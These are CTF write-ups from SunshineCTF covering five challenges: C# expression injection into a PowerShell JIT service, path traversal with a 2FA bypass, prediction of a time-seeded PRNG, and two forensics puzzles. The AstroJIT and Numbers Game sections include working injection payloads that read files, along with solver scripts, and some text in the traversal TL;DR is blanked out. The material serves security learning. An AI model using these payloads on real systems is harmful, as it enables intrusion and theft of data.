# SunshineCTF 2025 — Writeups



---

## AstroJIT AI CTF Writeup

### Challenge Summary
AstroJIT AI is a remote PowerShell application that JIT-compiles user-provided "weight" lists into C#. The service exposes a menu with options to register weights, chat with the AI, train on emails, inspect weights, and exit. Guest access skips the API token requirement, letting us interact with every menu item.

### Recon
- Submitting a simple payload like `{1,2,3}` to option 1 succeeds and returns to the menu.
- Feeding `{nan}` breaks compilation. PowerShell prints the generated C# source from `/app/evil_corp_ai.ps1`, confirming our input is spliced into `new[]{ ... }` within `CalculatePrecompiledWeights()`.
- The leaked source reveals only semicolons are stripped; otherwise, the payload becomes a raw C# expression evaluated inside the trusted app domain.

### Vulnerability
Because the service compiles our brace-delimited values directly into a C# array literal, we can supply arbitrary expressions. No sandboxing prevents filesystem access from within the compiled code, and the later "Weight Debugging" option echoes the evaluated results without the censorship logic that filters the chat bot output.

### Exploitation Steps
1. Connect in guest mode:
   ```bash
   nc astrojit.sunshinectf.games 25006
   ```
2. Choose option 1 (Register Weights) and submit a discovery payload, for example:
   ```
   {System.String.Join(",",System.IO.Directory.GetFiles("."))}
   ```
   This lists local files, revealing `flag.txt`.
3. Re-run option 1 with a read payload:
   ```
   {System.IO.File.ReadAllText("flag.txt")}
   ```
4. Choose option 4 (Weight Debugging). The service prints the stored weight for `a`, which now contains the flag.

### Automation Snippet
```python
import telnetlib

HOST, PORT = 'astrojit.sunshinectf.games', 25006

with telnetlib.Telnet(HOST, PORT) as t:
    t.read_until(b'use guest mode: ')
    t.write(b'\n')
    t.read_until(b'Enter an option: ')
    t.write(b'1\n')
    t.read_until(b'Weights: ')
    t.write(b'{System.IO.File.ReadAllText("flag.txt")}\n')
    t.read_until(b'Enter an option: ')
    t.write(b'4\n')
    print(t.read_until(b'Enter an option: ').decode())
```

### Flag
```
sun{evil-corp-one-uprising-at-a-time-folks-may-be-evil-but-do-not-get-burnt-out-just-burn-the-building-down-before-you-go-we-need-the-insurance-money}
```

### Takeaways
- Treat any user-controlled strings that reach `Add-Type` in PowerShell as code; expression-level sanitisation is mandatory.
- Attempted censorship applied only to chat responses, leaving other functionality (like weight debugging) as a clean data exfiltration channel.
- Even without semicolons, C# expressions provide ample surface for file I/O and other privileged actions when executed in-process.

---

## Lunar File Invasion – SunshineCTF 2025 Write-up

### TL;DR
- pointed to , leaking an editor backup  with hardcoded admin creds.
- Authenticated access exposed an  route that only blacklisted literal .
- Double-encoding  () let me pivot from  to recover  and , revealing the 2FA PIN .
- Reusing the traversal against  produced the flag: .

### Recon
1. Visited the landing page (trimmed HTML shown in the original artifacts).
2. Pulled `robots.txt`, which referenced a pseudo `.gitignore` file and listed backup template paths (`/index/static/login.html~`, etc.). One backup contained hardcoded admin creds.

### Initial Admin Access
Using the exposed credentials, I pulled the login form to harvest a CSRF token and logged in. The server accepted the credentials but enforced a second factor through `/2FA`.

### Mapping the Admin Surface
Authenticated browsing of `/admin` and related routes showed a file manager listing – with a client-side call to a download route. Initial traversal `../` was blocked, but error responses hinted at templated paths and weak filtering.

### Download Route Analysis
Grabbing backend source via traversal confirmed the weak blacklist that checked for a literal substring only. Mixing encoded separators and resolving canonical paths bypassed the guard.

### Obtaining the 2FA PIN
1. Enumerated project structure and pulled `models.py`, which pointed to an SQLite DB.
2. Downloaded the DB using doubly encoded traversal.
3. Parsed the relevant table locally to recover the 2FA PIN column.

### Completing 2FA
With a fresh CSRF token from the login page, the recovered PIN cleared 2FA and proved full administrator access.

### Flag Retrieval
Traversing again, targeting the revealed `FLAG/flag.txt`, yielded the flag.

### Post-Exploitation Notes
- Backup files left in the static tree leak secrets even when the primary templates are sanitized.
- Blacklisting fragments is ineffective; rely on canonical path resolution with fixed base directories.
- Storing 2FA secrets alongside application assets makes MFA moot when LFI is possible.

---

## SunshineCTF 2024 - Numbers Game Writeup

### Challenge Overview
- Category: Reverse Engineering
- Binary: numbers-game (64-bit PIE ELF)
- Service: nc chal.sunshinectf.games 25101
- The prompt teased a ridiculous number of fingers, pointing to a deterministic solution hidden in the binary.

### Initial Recon
1. Ran the binary locally to observe the banner and input flow.
2. Used objdump -d and section dumps to follow control flow and find embedded strings.
3. Located the success path that issues `system("cat flag.txt")` after comparing an unsigned integer.

### Reversing the Core Logic
```c
srand(time(NULL));
long r1 = rand();
long r2 = rand();
long r3 = rand();
unsigned long target = (r1 & 0x7fffffff)
                     | ((unsigned long)(r2 & 0x7fffffff) << 31)
                     | ((unsigned long)(r3 & 0x3) << 62);
scanf("%llu", &guess);
if (guess == target)
    system("cat flag.txt");
```
- The seed comes straight from `time(NULL)`, so the server and client share nearly identical seeds.
- Combining three consecutive `rand()` outputs into a 64-bit value is still predictable once the seed is known.

### Exploit Strategy
1. Reproduce glibc's PRNG locally via `ctypes.CDLL("libc.so.6")` to access `srand` and `rand`.
2. Recalculate the target value using the current timestamp (optionally scan a few surrounding seconds for skew).
3. Connect to the remote socket, submit the guess, and retry quickly until the remote seed matches the local one.

### Solver Script
```python
#!/usr/bin/env python3
import socket
import time
import ctypes

HOST, PORT = "chal.sunshinectf.games", 25101
libc = ctypes.CDLL("libc.so.6")

def compute_target(seed: int) -> int:
    libc.srand(seed)
    r1, r2, r3 = libc.rand(), libc.rand(), libc.rand()
    value  = (r1 & 0x7fffffff)
    value |= (r2 & 0x7fffffff) << 31
    value |= (r3 & 0x3) << 62
    return value & 0xffffffffffffffff

while True:
    with socket.create_connection((HOST, PORT)) as sock:
        banner = sock.recv(4096)
        seed = int(time.time())
        guess = compute_target(seed)
        sock.sendall(f"{guess}\n".encode())
        response = sock.recv(4096)
        print(banner.decode(errors="ignore"))
        print(response.decode(errors="ignore"))
        if b"sun{" in response:
            break
    time.sleep(0.2)
```

### Result
```
sun{I_KNOW_YOU_PLACED_A_MIRROR_BEHIND_ME}
```

### Takeaways
- PRNGs seeded with low-entropy values such as the current Unix time are trivial to predict.
- Combining multiple `rand()` outputs does not add security when the seed is guessable.
- Inspecting for system calls or file I/O in reversing challenges often uncovers the win condition immediately.

---

## Intergalactic Copyright Infringement — Forensics Writeup

**Category:** Forensics  
**Points:** 455  
**Author:** tsuto  
**Flag format:** `sun{...}`

### Summary
We were given a PDF named `prettydeliciouscakes.pdf` with the hint:

> “This cake is out of this world! … something else is out of place too. Note: This is not a steganography challenge.”

The PDF contains an embedded file (not an image-stego payload). The embedded file is a short JavaScript-like text that holds a Base64-encoded string. Decoding that string yields the flag.

**Flag:** `sun{p33p_d1s_fl@g_y0!}`

### Files
- `prettydeliciouscakes.pdf` (provided)

### Tools and environment
- Hex viewer or `strings` to triage the PDF
- PDF object inspection (manual or with a parser)
- Python (for quick extraction/decompression of streams)

I used a minimal Python script to extract embedded objects and inspect their streams.

### Methodology
1. Sanity checks: look for `/EmbeddedFile`, `/Names`, `/AA`.
2. Scan the PDF structure; in this PDF, `/EmbeddedFile` and `/Names` are present.
3. Extract the embedded stream; decompress `FlateDecode` if present.
4. Decode the Base64 payload.

Example embedded content:
```
const data = 'c3Vue3AzM3BfZDFzX2ZsQGdfeTAhfQ==';
```
Decodes to:
```
sun{p33p_d1s_fl@g_y0!}
```

### Lessons learned
- When a challenge says “not steganography,” believe it. PDFs can carry embedded files or actions that are easy to miss if you only inspect images.
- Check PDF object trees for `/EmbeddedFile`, `/Names`, `/AA`, `/OpenAction`, and filters like `/FlateDecode` that you may need to decompress.

---

## t0le t0le — Forensics Challenge Writeup

### Challenge Description
We were given a suspicious DOCX file from a CCDC inject. The business team member seemed obsessed with a cat image, but the note explicitly stated that this is not a steganography challenge. The flag format was specified as `sun{}`.

### Step 1: Inspect the DOCX File
A `.docx` is just a ZIP archive. Unzipping it revealed the usual `word/` directory structure. Inside, there was an interesting file:
```
word/embeddings/oleObject1.bin
```
This suggested an embedded OLE object.

### Step 2: Examine the OLE Object
Opening `oleObject1.bin` revealed a ROT13-able string:
```
fha{g0yr_g0yr_zl_o3y0i3q!}
```

### Step 3: Decode the Hidden String
The challenge text inside the document mentioned “tOle tOle my beloved,” hinting at ROT13. Applying ROT13 produced:
```
sun{t0le_t0le_my_b3l0v3d!}
```

### Step 4: Verify
- Format matches `sun{}`.
- Transformation is supported by the hint.
- No image stego required.

### Final Flag
```
sun{t0le_t0le_my_b3l0v3d!}
```
